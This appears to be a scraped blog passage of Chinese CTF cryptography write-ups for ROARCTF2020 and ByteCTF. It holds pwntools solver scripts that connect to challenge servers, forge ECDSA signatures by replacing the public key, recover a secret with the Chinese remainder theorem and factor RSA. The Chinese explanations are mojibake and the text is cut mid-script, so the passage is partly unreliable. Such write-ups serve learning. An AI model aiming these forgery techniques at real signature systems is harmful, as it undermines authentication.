r=remote(\u0026#39;139.129.98.9\u0026#39;,30001) data = r.recvline() prefix, s = parse(\u0026#34;sha256(XXXX+{}) == {}\u0026#34;,data) r.recvuntil(\u0026#39;Give me XXXX:\u0026#39;) r.sendline(brute_force(prefix,s)) r.recvline() r.recvline() m1 = long_to_bytes(int(parse(\u0026#34;Here is the frist message(64 bytes):{}\u0026#34;,r.recvline())[0],16)) m2 = long_to_bytes(int(parse(\u0026#34;Here is the second message(64 bytes):{}\u0026#34;,r.recvline())[0],16)) r1 = int(parse(\u0026#34;The frist message\u0026#39;s \u0026#39;r\u0026#39;:{}\u0026#34;,r.recvline())[0]) print(m1) print(m2) #sage solve order q: g^q=1(mod p) q = 1039300813886545966418005631983853921163721828798787466771912919828750891 assert(pow(g, q, p) == 1) assert(gcd(q, p-1) == q) M1,y1,h1,b1 = get_parameter(m1) M2,y2,h2,b2 = get_parameter(m2) s1 = sign(m1, r1) p1 = b1*r1 p2 = M2-M1 p3 = p1-p2 p4 = invert(b2,q) r2 = (p3*p4)%q s2 = sign(m2,r2) if s1==s2: print(\u0026#39;r1 = \u0026#39;+str(r1)) print(\u0026#39;r2 = \u0026#39;+str(r2)) print(\u0026#39;s1 = \u0026#39;+str(s1)) print(\u0026#39;s2 = \u0026#39;+str(s2)) print(\u0026#39;verify(m2,r2,s2) = \u0026#39;+str(verify(m2,r2,s2))) r.recvuntil(\u0026#39;Please choice your options:\u0026#39;) r.sendline(\u0026#39;3\u0026#39;) r.sendlineafter(\u0026#39;Please give me the (r,s) of the second message:\u0026#39;,\u0026#39;(\u0026#39;+str(r2)+\u0026#39;,\u0026#39;+str(s2)+\u0026#39;)\u0026#39;) print(r.recvall()) ROARCTF2020 # Reverse # å‚è€ƒ https://kt.gy/blog/2015/10/asis-2015-finals-rsasr/ å› ä¸ºpå’Œqæ˜¯äºŒè¿›åˆ¶é¡ºåºç›¸åçš„ç´ æ•°ï¼Œæ‰€ä»¥pçš„æ¯ä¸€ä½éƒ½å’Œqæœ‰å…³ç³»ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•éå†pçš„äºŒè¿›åˆ¶ï¼Œé€šè¿‡åˆ¤æ–­ç”Ÿæˆçš„pä¸qå†è¿›è¡Œè¿­ä»£ã€‚å…·ä½“ä»£ç å¦‚ä¸‹ï¼š\nn = 158985980192501034004997692253209315116841431063210516613522548452327355222295231366801286879768949611058043390843949610463241574886852164907094966008463721486557469253652940169060186477803255769516068561042756903927308078335838348784208212701919950712557406983012026654876481867000537670622886437968839524889 def Brute_force(a,b,k): if k == 256: if a*b==n: print (a,b) return 0 for i in range(2): for j in range(2): a1=a+i*(2**(511-k))+j*(2**k) b1=b+j*(2**(511-k))+i*(2**k) if a1*b1\u0026gt;n: continue if (a1+2**(511-k))*((b1+2**(511-k)))\u0026lt; n: continue if (a1*b1)%(2**(k+1)) != n%(2**(k+1)): continue Brute_force(a1,b1,k+1) return 0 Brute_force(0,0,0) ECDSA # è¿™é“é¢˜è´¼ç‹ ï¼Œæºç éƒ½ä¸ç»™ï¼Œæ¥çœ‹ä¸€çœ‹MENUå­\n[DEBUG] Received 0xd bytes: b\u0026#39;Give me XXXX:\u0026#39; [DEBUG] Sent 0x5 bytes: b\u0026#39;bwUI\\n\u0026#39; [DEBUG] Received 0x4f bytes: b\u0026#39;Hello,guys!Welcome to my ECC Signature System!I promise no one can exploit it!\\n\u0026#39; [DEBUG] Received 0x269 bytes: b\u0026#39;Howevers if you can exploit it in 10 times,I will give what you want!\\n\u0026#39; b\u0026#39;Here is the frist message(64 bytes):fipoN9jy/*@~J:] PcZY8{\u0026amp;X!7v+\\\\duTln_#k(WK^Q2L)\u0026lt;SbM$-V=Ex3Uw|h,%}F\\n\u0026#39; b\u0026#39;Here is the second message(64 bytes):%wh-(xJ4kR+7\u0026lt;^Zv9,Ol\\\\Kp/\u0026amp;\u0026#34;FHbc_ D@Y*mSos}V?.#L{!3B8QiP=nqCI[y:X2\\n\u0026#39; b\u0026#39;Try to calculate the same signature for this two messages~\\n\u0026#39; b\u0026#39;(((Notice: curve = SECP256k1, hashfunc = sha1)))\\n\u0026#39; b\u0026#39;\\n\u0026#39; b\u0026#39;ECC Signature System:\\n\u0026#39; b\u0026#39; 1. Show your pubkey\\n\u0026#39; b\u0026#39; 2. Generate new prikey\\n\u0026#39; b\u0026#39; 3. Update your pubkey\\n\u0026#39; b\u0026#39; 4. Sign a message\\n\u0026#39; b\u0026#39; 5. Verify a message\\n\u0026#39; b\u0026#39; 6. Exploit\\n\u0026#39; b\u0026#39; 7. Exit\\n\u0026#39; b\u0026#39;\\n\u0026#39; b\u0026#39;You have only 10 times to operate!\\n\u0026#39; b\u0026#39;Please choice your options:\u0026#39; æ ¹æ®é¢˜ç›®åè¿™æ˜¯ä¸€ä¸ªECDSAçš„ç­¾åç³»ç»Ÿï¼Œå®Œäº†å‘¢è¦æ±‚æ˜¯ç»™è¿™ä»–æä¾›çš„ä¸¤ä¸ªmsgç­¾åï¼Œä¸ä»…éªŒè¯è¦é€šè¿‡ï¼Œè€Œä¸”ç­¾åè¿˜å¾—ä¸€æ ·ã€‚\nå…ˆæ¥çœ‹çœ‹è¿™å‡ ä¸ªåŠŸèƒ½ï¼Œ\nåŠŸèƒ½1æ˜¯æ˜¾ç¤ºå…¬é’¥ï¼Œï¼ˆå¯èƒ½è¦åˆ©ç”¨ï¼‰\nåŠŸèƒ½2æ˜¯é‡æ–°ç”Ÿæˆä¸€ä¸ªç§é’¥ï¼Œï¼ˆåº”è¯¥æ˜¯æ²¡ç”¨çš„ï¼Œæ²¡å•¥æ„ä¹‰ï¼Œç”Ÿæˆåå°±æ˜¯å‘Šè¯‰ä½ æ›´æ–°åçš„å…¬é’¥ï¼‰\nåŠŸèƒ½3æ˜¯æ›´æ–°ä½ çš„å…¬é’¥ï¼Œä½ æ¥è¾“å…¥ï¼ˆè¿™ä¸ªè‚¯å®šæœ‰ç‚¹ç”¨ï¼‰\nåŠŸèƒ½4æ˜¯å¸®ä½ ç­¾ä¸ªå ï¼ˆä¹Ÿè®¸ç”¨å¾—ä¸Šï¼‰\nåŠŸèƒ½5æ˜¯éªŒè¯ç­¾å ï¼ˆå¯ä»¥ï¼Œä½†æ²¡å¿…è¦ï¼‰\nåŠŸèƒ½6å°±æ˜¯æ•´å®Œäº†ç”¨æ¥è·å–flagçš„äº†ã€‚\nå…­ä¸ªåŠŸèƒ½ä¸€çœ¼çœ‹æ¥ä¹Ÿå°±è¿™ä¸ªåŠŸèƒ½3å¯ä»¥ç”¨äº†ã€‚è¿™é‡Œéœ€è¦ä¸€ç‚¹å‰ç½®çŸ¥è¯†ï¼ˆç°æŸ¥å°±å¯ä»¥äº†ï¼Œä¸€æ ·çš„ï¼‰ï¼Œå°±æ˜¯ECDSAç­¾åçš„éªŒè¯è§„åˆ™\nè¿™ç§\rèµ„æ–™CSDNä¸€æŠ“ä¸€å¤§æŠŠã€‚\nimage-20201207214850259\næœ€åæ˜¯åˆ¤æ–­ v = rï¼Œå³ X.x = dG.x ,æˆ‘ä»¬å¯ä»¥æŠŠéªŒè¯å…¬å¼æå–å‡ºæ¥ï¼Œä¹Ÿå³ $es^{-1}G + rs^{-1}Q = dG$\næ³¨æ„åˆ°ç”±äºéªŒè¯ç”¨çš„æ˜¯å…¬é’¥Qï¼Œç„¶åé¢˜ç›®æ˜¯æä¾›ç¯¡æ”¹å…¬é’¥è¿™ä¸ªåŠŸèƒ½çš„ï¼Œæˆ‘ä»¬çŸ¥é“ECDSAä¸­$Q = kG$, å…¶ä¸­kæ˜¯ç§é’¥ï¼Œé‚£ä¹ˆå…¶å®ç­‰ä»·äºæˆ‘ä»¬æ˜¯å¯ä»¥ç¯¡æ”¹ç§é’¥çš„ï¼Œå³æˆ‘ä»¬ç”¨è‡ªå·±çš„ç§é’¥å»ç»™ä¸€ä¸ªä¿¡æ¯ç­¾åï¼Œå®Œäº†åæŠŠç”¨äºéªŒè¯çš„å…¬é’¥ç»™æ”¹æˆæˆ‘ä»¬è‡ªå·±çš„å…¬é’¥ï¼ŒéªŒè¯åŒæ ·ä¹Ÿæ˜¯å¯ä»¥é€šè¿‡çš„ã€‚é‚£ä¹ˆæ•´ä¸ªè¿‡ç¨‹ç³»ç»Ÿçš„ç§é’¥éƒ½ä¸å‚ä¸äº†ã€‚\nè§£å†³äº†ç­¾åéªŒè¯çš„é—®é¢˜ï¼Œå‰©ä¸‹æ¥å°±æ˜¯è§£å†³å¦‚ä½•è®©ä»–ä»¬çš„ç­¾åä¿æŒä¸€è‡´äº†ã€‚\nå›åˆ°éªŒè¯å…¬å¼ $es^{-1}G + rs^{-1}Q = dG$\nå…¶ä¸­eæ˜¯æˆ‘ä»¬çš„æ¶ˆæ¯ï¼Œå¯ä»¥çœ‹ä½œå·²çŸ¥å¸¸æ•°ï¼Œrå’Œsæ˜¯æˆ‘ä»¬èƒ½æ§åˆ¶çš„ï¼ŒGæ˜¯å›ºå®šçš„ï¼ŒQæ˜¯å…¬é’¥ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬è‡ªå·±å†³å®šï¼Œdæ˜¯ç­¾åæ—¶ç”¨çš„éšæœºæ•°ï¼Œæ•´ä¸ªç­¾åçš„è¿‡ç¨‹æˆ‘ä»¬éƒ½èƒ½æŒæ¡ï¼Œè‡ªç„¶dä¹Ÿæœ‰æˆ‘ä»¬å†³å®šï¼Œç„¶ådä¼šå†³å®šrï¼Œå› ä¸ºr = dG.xï¼Œ é‚£ä¹ˆrä¹Ÿå°±å›ºå®šä¸‹æ¥äº†ï¼Œåªå‰©Qå’Œsäº†ã€‚\næˆ‘ä»¬æŠŠå…¬å¼çº¦ä¸€çº¦ï¼Œå»æ‰Gåå°±æ˜¯ $es^{-1} + rs^{-1}k = d =\u0026gt; e + rk = ds =\u0026gt; s = (e + rk)*d^{-1}$\nç”±äºä¸¤ä¸ªmsgçš„sè¦ä¿æŒä¸€ç›´ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ„é€ çš„ç­‰å¼å°±æ˜¯$ (e_1 + rk) * d^{-1} = (e_2 + rk) * d^{-1}$\nå¾ˆæ˜¾ç„¶å•Šï¼Œå› ä¸ºdä¸èƒ½ç­‰äº0ï¼Œè¿™ç­‰å¼ä¸å¯èƒ½æˆç«‹å•Šï¼Œäºæ˜¯é™·å…¥åƒµå±€ã€‚\nä½†è¿™é‡Œæˆ‘ä»¬å¿˜äº†ä¸€ä¸ªå¾ˆé‡è¦çš„æ€§è´¨ï¼Œå°±æ˜¯ï¼Œæˆ‘ä»¬æœ€åéªŒè¯çš„æ˜¯v = rï¼Œè€Œræ˜¯ä»€ä¹ˆï¼Œr = dG.xï¼Œæˆ‘ä»¬è¦çŸ¥é“çš„æ˜¯ï¼Œæ¤­åœ†æ›²çº¿æ˜¯ä¸€ä¸ªå…³äºxè½´å¯¹ç§°çš„å›¾å½¢ï¼Œæ‰€ä»¥å…¶å® r = -dG.xã€‚åç‚¹éƒ½å‘ç°äº†ï¼Œè¿™é¢˜å°±è§£å†³äº†ï¼Œ\nç­‰å¼å˜ä¸º$ (e_1 + rk) * d^{-1} = (e_2 + rk) * (-d)^{-1}$\nåŒ–æˆåŒä½™å¼å°±æ˜¯$ (e_1 + rk) * d^{-1} \\equiv (e_2 + rk) * (-d)^{-1} \\pmod{n}$\næœ‰ $e_1 + rk \\equiv -e_2 -rk\\pmod{n}$\næœ‰ $k \\equiv \\frac{-e1-e2}{2r}\\pmod{n}$\nç„¶åæ€•ã€æˆ‘ä»¬å»æŸ¥ä¸€ä¸‹è¿™æ¡æ›²çº¿çš„\rå‚æ•°å³å¯\nå‚è€ƒè„šæœ¬\nfrom pwn import * from Crypto.Util.number import * sh=remote(\u0026#34;139.129.98.9\u0026#34;,\u0026#34;30002\u0026#34;) from pwnlib.util.iters import mbruteforce from hashlib import sha256 import hashlib from math import gcd context.log_level = \u0026#39;debug\u0026#39; a=0 b=7 q=0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F gx=0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798 gy=0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8 order=0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 ecc = EllipticCurve(GF(q), [a,b]) G = ecc(gx,gy) import hashlib def sha1(content): return hashlib.sha1(content).digest() def proof_of_work(sh): sh.recvuntil(\u0026#34;XXXX+\u0026#34;) suffix = sh.recvuntil(\u0026#39;)\u0026#39;).decode(\u0026#34;utf8\u0026#34;)[:-1] log.success(suffix) sh.recvuntil(\u0026#34;== \u0026#34;) cipher = sh.recvline().strip().decode(\u0026#34;utf8\u0026#34;) proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() == cipher, string.ascii_letters + string.digits, length=4, method=\u0026#39;fixed\u0026#39;) sh.sendlineafter(\u0026#34;Give me XXXX:\u0026#34;, proof) proof_of_work(sh) sh.recvuntil(\u0026#34;Here is the frist message(64 bytes):\u0026#34;) msg1 = sh.recvuntil(\u0026#34;\\n\u0026#34;)[:-1] sh.recvuntil(\u0026#34;Here is the second message(64 bytes):\u0026#34;) msg2 = sh.recvuntil(\u0026#34;\\n\u0026#34;)[:-1] message = hex(bytes_to_long(msg1))[2:] e1=bytes_to_long(sha1(msg1)) e2=bytes_to_long(sha1(msg2)) ###################################################### #è§£é¢˜æ ¸å¿ƒ #pubkey = sh.recvuntil(\u0026#34;\\n\u0026#34;)[:-2].decode() #r=[d * G].x d=12321 r=int((d*G)[0]) new_k = ((-e1-e2)*inverse(2*r,order))%order new_Q = new_k * G new_S = ((e1 + new_k*r)*inverse(d,order))%order newpubkey = hex(new_Q[0]).replace(\u0026#34;0x\u0026#34;,\u0026#34;\u0026#34;).rjust(64,\u0026#34;0\u0026#34;)+hex(new_Q[1]).replace(\u0026#34;0x\u0026#34;,\u0026#34;\u0026#34;).rjust(64,\u0026#34;0\u0026#34;) newsignature = hex(r).replace(\u0026#34;0x\u0026#34;,\u0026#34;\u0026#34;).rjust(64,\u0026#34;0\u0026#34;)+hex(new_S).replace(\u0026#34;0x\u0026#34;,\u0026#34;\u0026#34;).rjust(64,\u0026#34;0\u0026#34;) ###################################################### sh.recvuntil(\u0026#34;Please choice your options:\u0026#34;) sh.sendline(\u0026#34;3\u0026#34;) sh.recvuntil(\u0026#34;Please give me your public_key(hex):\u0026#34;) sh.sendline(newpubkey) sh.recvuntil(\u0026#34;Please choice your options:\u0026#34;) sh.sendline(\u0026#34;6\u0026#34;) sh.recvuntil(\u0026#34;Please give me the signature(hex) of the frist message:\\n\u0026#34;) sh.sendline(newsignature) sh.recvuntil(\u0026#34;Please give me the signature(hex) of the second message:\\n\u0026#34;) sh.sendline(newsignature) sh.interactive() \u0026lt;\n\u0026gt;\nByteCTF # noise # éœ€è¦å‰ç½®çŸ¥è¯†æˆ–äº†è§£ï¼šä¸­å›½å‰©ä½™å®šç†\ntask.py\n#!/usr/bin/env python3\rfrom os import urandom\rfrom random import choices\rfrom hashlib import sha256\rimport signal\rimport string\rimport sys\rdef getrandbits(bit):\rreturn int.from_bytes(urandom(bit \u0026gt;\u0026gt; 3), \u0026#34;big\u0026#34;)\rdef proof_of_work() -\u0026gt; bool:\ralphabet = string.ascii_letters + string.digits\rnonce = \u0026#34;\u0026#34;.join(choices(alphabet, k=8))\rprint(f\u0026#39;SHA256(\u0026#34;{nonce}\u0026#34; + ?) starts with \u0026#34;00000\u0026#34;\u0026#39;)\rsuffix = input().strip()\rmessage = (nonce + suffix).encode(\u0026#34;Latin-1\u0026#34;)\rreturn sha256(message).digest().hex().startswith(\u0026#34;00000\u0026#34;)\rdef main():\rsignal.alarm(60)\rif not proof_of_work():\rreturn\rsecret = getrandbits(1024)\rprint(\u0026#34;Listen...The secret iz...M2@9c0f*#aF()I!($Ud3;J...\u0026#34;\r\u0026#34;Hello?...really noisy here again...God bless you get it...\u0026#34;)\rfor i in range(64):\rtry:\rop = input().strip()\rnum = input().strip()\rexcept EOFError:\rreturn\rif not str.isnumeric(num):\rprint(\u0026#34;INVALID NUMBER\u0026#34;)\rcontinue\rnum = int(num)\rif op == \u0026#39;god\u0026#39;:\rprint(num * getrandbits(992) % secret)\relif op == \u0026#39;bless\u0026#39;:\rif num == secret:\rtry:\rfrom datetime import datetime\rfrom flag import FLAG\rexcept Exception as e:\rFLAG = \u0026#34;but something is error. Please contact the admin.\u0026#34;\rprint(\u0026#34;CONGRATULATIONS %s\u0026#34;%FLAG)\rreturn\rprint(\u0026#34;WRONG SECRET\u0026#34;)\rmain() è¿˜å¥½ï¼Œç¬¬ä¸€é¢˜ä»£ç é‡ä¸å¤§ï¼Œä¸é”™ä¸é”™ã€‚çœ‹ä¸€çœ‹ï¼Œè¿™ä¸€é¢˜åŠŸèƒ½å¾ˆç®€å•ï¼Œä½ è¾“å…¥ä¸€ä¸ªæ•°å­—ï¼Œä»–è¿”å›ç»™ä½ ä¸€ä¸ªï¼Œä½ çš„æ•°å­— ä¹˜ä¸Šä¸€ä¸ª992bitçš„ éšæœºæ•°å­— æ¨¡ä¸Šä¸€ä¸ª1024bitçš„secret çš„ç»“æœã€‚å½“ç„¶ï¼Œæ¯æ¬¡è¿æ¥ä¸Šåç”Ÿæˆçš„secretæ˜¯éšæœºçš„ï¼Œä½†æ˜¯è¿ä¸Šä¸€æ¬¡ï¼Œå¯ä»¥äº¤äº’64æ¬¡ï¼Œæ­¤æ—¶secretæ˜¯ä¿æŒä¸å˜çš„ã€‚ç®—ä¸Šä½ éœ€è¦ä¸€æ¬¡äº¤äº’æ¥è·å–flagï¼Œé‚£ä¹ˆå°±æ˜¯éœ€è¦åœ¨63æ¬¡ä¹‹å†…â€œçŒœâ€åˆ°è¿™ä¸ªéšæœºç”Ÿæˆçš„secretã€‚\nå¥½çš„ï¼Œä¸Šå¼å­ï¼Œæˆ‘ä»¬çŸ¥é“ä¸­å›½å‰©ä½™å®šç†æ˜¯è¿™æ ·å­çš„\n$m \\equiv c_1 \\pmod {n_1}$ $m = c_1+k_1n_1$\n$m \\equiv c_2 \\pmod {n_2}$ ç­‰ä»·äº $m = c_2+k_2n_2$\n$m \\equiv c_3 \\pmod {n_3}$ $m = c_3+k_3n_3$\næ³¨æ„è¿™é‡Œçš„æ¨¡æ˜¯nï¼Œä»–ä»¬å½¼æ­¤äº’ç´ ï¼Œç„¶ååˆ©ç”¨ä¸­å›½å‰©ä½™å®šç†å°±å¯ä»¥æ¢å¤mï¼ˆå¦‚æœmçš„bitä½æ•°å°äºæ‰€æœ‰nçš„bitä½æ•°ä¹‹å’Œçš„è¯ï¼‰\næ­¤æ—¶ï¼Œå¦‚æœkéƒ½ç­‰äº1ï¼Œé‚£ä¹ˆï¼Œ\n$m = c_1+n_1$ $m = n_1+c_1$\n$m = c_2+n_2$ ç­‰ä»·äº $m = n_2+c_2$\n$m = c_3+n_3$ $m = n_3+c_3$\næ­¤æ—¶nå’Œcå°±å¥½åƒç­‰ä»·äº†ï¼Œå¹¶ä¸èƒ½çŸ¥é“æ¨¡æ•°åˆ°åº•æ˜¯å“ªä¸ªï¼Œæ¢ä¸€ä¸ªè¯´æ³•å°±æ˜¯ï¼Œnå’Œcéƒ½å¯ä»¥çœ‹ä½œæ˜¯æ¨¡æ•°\næˆ‘ä»¬å†å›åˆ°è¿™é“é¢˜æœ¬èº«ï¼Œè®¾æˆ‘ä»¬å‘é€çš„å€¼æ˜¯$n_1,n_2,n_3$ï¼Œsecretä¸ºsï¼Œè¿”å›çš„å€¼æ˜¯$c_1,c_2,c_3$ï¼Œ\né‚£ä¹ˆå°±ä¼šæœ‰è¿™ä¹ˆäº›å¼å­\n$n_1 * randnum1 \\equiv c_1 \\pmod s = c_1+k_1s$\n$n_2 * randnum2 \\equiv c_2 \\pmod s= c_2+k_2s$\n$n_3 * randnum3 \\equiv c_3 \\pmod s= c_3+k_3s$\næ­¤æ—¶å¦‚æœkå€¼éƒ½ä¸º1ï¼Œå†æŒªä¸ªä½ç½®ï¼Œé‚£ä¹ˆå°±æœ‰\n$s = n_1 * randnum1- c_1$\n$s = n_2* randnum2 - c_2$\n$s = n_3 * randnum3- c_3$\næ­¤æ—¶å¦‚æœæˆ‘ä»¬å¼å­ä¸¤è¾¹å»ä¸€ä¸ªæ¨¡$n_1,n_2,n_3$\n$s \\equiv- c_1 \\pmod{n_1}$\n$s \\equiv- c_2 \\pmod{n_2}$\n$s \\equiv- c_3 \\pmod{n_3}$\nè¿™ä¸å°±æ˜¯ä¸­å›½å‰©ä½™å®šç†å½¢å¼ä¹ˆï¼Ÿæ‰€ä»¥å½“ç­‰äº1ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ä¸­å›½å‰©ä½™å®šç†æ¥æ¢å¤è¿™ä¸ªsecret\néœ€è¦æ»¡è¶³çš„æ¡ä»¶å°±æ˜¯ï¼Œ$n*randnum = c+s$ï¼Œè¿˜æœ‰å°±æ˜¯nçš„bitä½æ•°ä¹‹å’Œè¦å¤§äºsçš„bitä½æ•°å³1024\nå½“ç„¶ï¼Œè¿™å°±éœ€è¦è¿æ°”äº†ï¼Œå› ä¸ºä»–è¿œç¨‹ç”Ÿæˆçš„ä¹˜æ•°æ˜¯éšæœºçš„992bitæ•°å­—ï¼ˆå½“ç„¶æ˜¯æœ‰å¯èƒ½ä¼šå°äº992bitçš„ï¼‰ï¼Œè€Œsæ˜¯1024bitçš„æ•°å­—ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å‘é€çš„nå¤§æ¦‚å°±æ˜¯32bitçš„ç´ æ•°ï¼Œ32*32=1024ï¼Œæ‰€ä»¥åœ¨63æ¬¡äº¤äº’å†…æˆ‘ä»¬éœ€è¦æœåŠ¡å™¨ç”Ÿæˆ32ä¸ªéšæœºæ•°æ˜¯â€œå¥½â€çš„ï¼Œæ‰€è°“â€å¥½â€â€å°±æ˜¯è¦è®©è¿™ä¸ªkæ­£å¥½ç­‰äº1ã€‚\næˆ‘ä»¬ä¹Ÿå¯ä»¥å…ˆæœ¬åœ°ç®€å•çš„æµ‹ä¸€æµ‹ï¼Œå¯ä»¥é€‰æ‹©æ¯”è¾ƒå°çš„æ•°ç»™ä»–ä¹˜ï¼Œè¿™æ ·å­çš„kå¤§æ¦‚ç‡ä¼šæ˜¯0æˆ–è€…1ï¼Œè€Œ0æ¯”è¾ƒå¥½åˆ¤æ–­ï¼Œç›´æ¥åˆ¤æ–­è¿”å›çš„å€¼æ˜¯å¦è¢«æˆ‘ä»¬å‘é€è¿‡å»çš„æ•°æ•´é™¤å°±å¯ä»¥äº†ã€‚è€Œæ˜¯å¦æ­£å¥½ç­‰äº1æˆ‘ä»¬æ˜¯æ— æ³•åˆ¤æ–­çš„ï¼Œä½†å‡¡ä¸€ç»„æ•°æ®æ’å…¥äº†ä¸€ä¸ªè®©kä¸ç­‰äº1æˆ–è€…0çš„æ•°ï¼Œé‚£ä¹ˆæ•´ç»„æ•°æ®å°±ä½œåºŸäº†ã€‚æ‰€ä»¥æˆ‘ä»¬å‘é€å°½é‡å°çš„æ•°nï¼Œè®©kå€¼å¤§æ¦‚ç‡åªè½åœ¨0æˆ–è€…1ä¸Šã€‚\næµ‹è¯•ä»£ç ï¼š\nfrom random import *\rprimes = [4294966427, 4294966441, 4294966447, 4294966477, 4294966553, 4294966583, 4294966591, 4294966619, 4294966639, 4294966651, 4294966657, 4294966661, 4294966667, 4294966769, 4294966813, 4294966829, 4294966877, 4294966909, 4294966927, 4294966943, 4294966981, 4294966997, 4294967029, 4294967087, 4294967111, 4294967143, 4294967161, 4294967189, 4294967197, 4294967231, 4294967279, 4294967291]\rfor _ in range(20):\rsecret = getrandbits(1024)\rfor num in primes:\rprint(num * getrandbits(992) // secret),\rprint è¿™é‡Œæˆ‘ä»¬é€‰æ‹©å›ºå®šäº†éšæœºæ•°ï¼Œç„¶åç»è¿‡20æ¬¡çš„æµ‹è¯•ï¼Œä¸‹é¢æ˜¯æµ‹è¯•ç»“æœ\nimage-20201102145925061\nå¯ä»¥å‘ç°ï¼Œç”Ÿæˆçš„éšæœºæ•°ä¼¼ä¹ä¹Ÿå…·æœ‰ä¸€å®šç¨‹åº¦çš„å±€éƒ¨æ€§ï¼Œå½“kå‡ºç°7ï¼Œ8è¿™æ ·æ¯”è¾ƒå¤§çš„æ•°çš„æ—¶å€™ï¼Œå‡ ä¹æ•´ç»„çš„kéƒ½æ¯”è¾ƒå¤§ï¼Œä½†å¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œç”±äºæˆ‘ä»¬è¾“å…¥çš„ç´ æ•°æ¯”è¾ƒå°ï¼Œè¿˜æ˜¯åªæœ‰0å’Œ1çš„æƒ…å†µåå¤šï¼Œä½†ä¸€èˆ¬ä¹Ÿæ˜¯0åå¤šï¼Œæ‰€ä»¥ï¼Œï¼Œçœ‹è„¸äº†ï¼Œåªè¦æœ‰ä¸€åŠä»¥ä¸Šçš„1ï¼Œæˆ‘ä»¬å°±æˆåŠŸäº†ã€‚\nè§£é¢˜æµç¨‹ï¼š # ç¡®å®š63ä¸ªæ¯”è¾ƒå°çš„ç´ æ•° æŠŠè¿™äº›å€¼å‘é€è¿‡å» æ”¶åˆ°çš„å€¼è¿›è¡Œä¸€ä¸ªåˆ¤æ–­ï¼Œæ˜¯å¦è¢«è‡ªå·±å‘è¿‡å»çš„æ•°æ•´é™¤ï¼Œæ˜¯å°±æ‰”æ‰ï¼Œå¦åˆ™å°±å­˜èµ·æ¥ å­˜èµ·æ¥çš„æ•°è¶…è¿‡32ä¸ªå°±å¯ä»¥è¿›è¡ŒCRTå°è¯•æ¢å¤secret å‘é€secretè¿‡å»éªŒè¯ï¼Œè¦æ˜¯æ²¡æ‹¿åˆ°flagå°±å›åˆ°ç¬¬2æ­¥ï¼Œå¦‚æ­¤å¾ªç¯å¾€å¤ï¼ŒåŠ æ²¹å§ï¼Œçœ‹ä½ çš„è„¸äº†ï¼ expï¼š\nfrom pwn import * from hashlib import sha256 from tqdm import tqdm from Crypto.Util.number import * def GCRT(mi, ai): assert (isinstance(mi, list) and isinstance(ai, list)) curm, cura = mi[0], ai[0] for (m, a) in zip(mi[1:], ai[1:]): d = int(GCD(curm, m)) c = a - cura assert (c % d == 0) K = c // d * inverse(curm // d, m // d) cura += curm * K curm = curm * m // d cura %= curm return cura % curm, curm def proof_of_work(sh): sh.recvuntil(\u0026#34;SHA256(\\\u0026#34;\u0026#34;) nonce = sh.recv(8) sh.recvuntil(\u0026#39;with \\\u0026#34;00000\\\u0026#34;\u0026#39;) for a in tqdm(range(0x30, 0x7f)): for b in range(0x30, 0x7f): for c in range(0x30, 0x7f): for d in range(0x30, 0x7f): rest = chr(a) + chr(b) + chr(c) + chr(d) m = (nonce.decode(\u0026#39;latin1\u0026#39;) + rest).encode(\u0026#34;Latin-1\u0026#34;) if sha256(m).digest().hex().startswith(\u0026#34;00000\u0026#34;): sh.sendline(rest) sh.recvuntil(\u0026#39;again...God bless you get it...\u0026#39;) return def io(sh, num): sh.sendline(\u0026#39;god\u0026#39;) sh.sendline(str(num)) tmp = sh.recvuntil(\u0026#39;\\n\u0026#39;) if len(tmp) \u0026gt; 100: return int(tmp) else: return int(sh.recvuntil(\u0026#39;\\n\u0026#39;)) primes = [4294966427, 4294966441, 4294966447, 4294966477, 4294966553, 4294966583, 4294966591, 4294966619, 4294966639, 4294966651, 4294966657, 4294966661, 4294966667, 4294966769, 4294966813, 4294966829, 4294966877, 4294966909, 4294966927, 4294966943, 4294966981, 4294966997, 4294967029, 4294967087, 4294967111, 4294967143, 4294967161, 4294967189, 4294967197, 4294967231, 4294967279, 4294967291] for i in range(2**10): sh = remote(\u0026#34;182.92.153.117\u0026#34;, 30101) proof_of_work(sh) length = 32 c = [] index = 0 for i in range(63): tmp = io(sh, primes[index]) if tmp%primes[index] !=0:\t//è¿™ä¸ªåˆ¤æ–­æ˜¯å‰”é™¤kç­‰äº0çš„æƒ…å†µ c.append(-1 * tmp) index += 1 if index \u0026gt;= 32:\t//å¦‚æœè¶…è¿‡32ä¸ªæ•°çš„kä¸ç­‰äº0ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‹¿æ¥ç”¨äº†ï¼Œä½†ä¹Ÿä¸ç¡®å®šæ˜¯å¦è¿™32ä¸ªæ•°éƒ½ä¸º1 break if index \u0026lt; 32: continue secret = GCRT(primes, c)[0] sh.sendline(\u0026#39;bless\u0026#39;) sh.sendline(str(secret)) tmp = sh.recvuntil(\u0026#39;\\n\u0026#39;) if len(tmp) \u0026lt; 5: tmp = sh.recvuntil(\u0026#39;\\n\u0026#39;) if b\u0026#39;WRONG\u0026#39; in tmp: sh.close() continue print(tmp) sh.interactive() threshold # éœ€è¦å‰ç½®çŸ¥è¯†æˆ–äº†è§£ï¼šæ¤­åœ†æ›²çº¿ç›¸å…³æ€§è´¨\nfrom gmssl import func, sm2 #from flag import FLAG flag=\u0026#34;Congratulations!\u0026#34; sm2p256v1_ecc_table = { \u0026#39;n\u0026#39;: \u0026#39;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123\u0026#39;, \u0026#39;p\u0026#39;: \u0026#39;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFF\u0026#39;, \u0026#39;g\u0026#39;: \u0026#39;32c4ae2c1f1981195f9904466a39c9948fe30bbff2660be1715a4589334c74c7\u0026#39; + 